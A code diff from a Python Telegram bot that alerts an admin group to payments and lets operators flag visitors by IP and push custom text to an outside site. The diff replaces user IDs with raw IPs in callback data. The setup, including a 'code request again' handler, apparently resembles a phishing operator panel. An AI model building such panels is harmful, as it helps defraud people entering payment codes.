@@ -1085,8 +1085,8 @@ async def payment_notify(request):
     ]
     if user_id:
         kb_rows.append([
-            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{user_id}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{user_id}")
+            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ])
     kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
@@ -1163,20 +1163,10 @@ async def code_request_again_handler(call: types.CallbackQuery):
 
 @router.callback_query(lambda c: c.data.startswith("support:"))
 async def admin_support_callback(call: types.CallbackQuery):
-    user_id_str = call.data.split(":")[1]
-    if not user_id_str.isdigit():
-        await call.answer("user_id не визначено")
-        return
-    user_id = int(user_id_str)
-    # Знаходимо ip для user_id (з user_data або бази)
-    ip = None
-    udata = user_data.get(user_id)
-    if udata:
-        ip = udata.get('ip')
+    ip = call.data.split(":")[1]
     if not ip:
         await call.answer("IP користувача не знайдено")
         return
-    # Ставимо флаг на сервері
     import aiohttp
     async def set_flag():
         async with aiohttp.ClientSession() as session:
@@ -1187,31 +1177,20 @@ async def admin_support_callback(call: types.CallbackQuery):
 
 @router.callback_query(lambda c: c.data.startswith("text:"))
 async def admin_text_callback(call: types.CallbackQuery):
-    user_id_str = call.data.split(":")[1]
-    if not user_id_str.isdigit():
-        await call.answer("user_id не визначено")
-        return
-    user_id = int(user_id_str)
-    # Знаходимо ip для user_id (з user_data або бази)
-    ip = None
-    udata = user_data.get(user_id)
-    if udata:
-        ip = udata.get('ip')
+    ip = call.data.split(":")[1]
     if not ip:
         await call.answer("IP користувача не знайдено")
         return
     await call.message.answer("Введіть текст для користувача:")
-    user_step[call.from_user.id] = f"text_for_{user_id}|{ip}"
+    user_step[call.from_user.id] = f"text_for_{ip}"
 
 @router.message(lambda m: user_step.get(m.from_user.id, "").startswith("text_for_"))
 async def admin_enter_text(message: types.Message):
     step = user_step[message.from_user.id]
-    user_id, ip = step.replace("text_for_", "").split("|")
-    user_id = int(user_id)
+    ip = step.replace("text_for_", "")
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     requests.post('https://artpullse.com/set_custom_text', json={'text_id': text_id, 'text': text})
-    # Ставимо флаг на сервері
     import aiohttp
     async def set_flag():
         async with aiohttp.ClientSession() as session:
